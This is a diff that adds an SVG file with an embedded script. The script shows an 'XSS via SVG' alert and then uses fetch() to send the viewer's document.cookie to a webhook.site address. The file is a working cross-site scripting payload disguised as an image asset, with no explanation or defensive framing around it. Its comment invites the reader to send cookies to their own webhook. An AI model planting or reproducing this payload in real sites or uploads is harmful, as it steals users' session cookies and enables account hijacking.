@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    alert('XSS via SVG!');
+    // Or send document.cookie to your webhook
+    fetch('https://webhook.site/b62c68d8-32d5-48ef-924a-3bd6a16cdcdc?cookie=' + document.cookie);
+  </script>
+</svg>
